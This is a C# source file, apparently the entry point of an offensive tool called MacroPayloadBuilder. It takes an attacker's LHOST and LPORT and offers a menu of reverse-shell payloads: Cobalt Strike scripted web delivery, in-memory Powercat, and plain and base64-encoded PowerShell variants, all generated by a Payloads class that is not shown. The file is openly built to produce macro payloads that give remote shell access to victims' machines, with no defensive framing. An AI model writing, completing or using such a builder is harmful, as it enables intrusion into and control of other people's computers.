using MacroPayloadBuilder;
using System.Text;

internal class Program
{
    private static void Main(string[] args)
    {
        Payloads payloads = new Payloads();
        bool exit = false;
        Console.WriteLine("Please enter the LHOST:");
        string lhost = Console.ReadLine();
        Console.WriteLine("\nPlease enter the LPORT:");
        string lport = Console.ReadLine();

        while (!exit)
        {
            Console.WriteLine("Please choose your reverse-shell payload:\n");
            Console.WriteLine("1: Cobalt Strike Scripted Web Delivery (With powershell b64)");
            Console.WriteLine("2: Encoded Powercat downloaded into memory (needs a server hosting Powercat.ps1 on the same IP as LHOST)");
            Console.WriteLine("3: Powershell standard");
            Console.WriteLine("4: Powershell base64 encoded");
            Console.WriteLine("5: Powershell cmd.exe /c method (base64)");
            Console.WriteLine("E: exit");
            string option = Console.ReadLine();

            switch (option)
            {
                case "1":
                    Console.WriteLine("\nPlease provide the URI of the payload (default is /a, no need for /): ");
                    string uri = Console.ReadLine();
                    payloads.CobaltStrikeSWD(lhost, lport, uri);
                    exit = true;
                    break;
                case "2":
                    payloads.encodedPowerCat(lhost, lport);
                    exit = true;
                    break;
                case "3":
                    payloads.powerShellStandard(lhost, lport);
                    exit = true;
                    break;
                case "4":
                    payloads.powershellEncoded(lhost, lport);
                    exit= true;
                    break;
                case "5":
                    payloads.powershellCMDEncoded(lhost, lport);
                    exit = true;
                    break;
                case "E" or "e":
                    Environment.Exit(0);
                    break;
                default:
                    break;
            }
        }
    }
}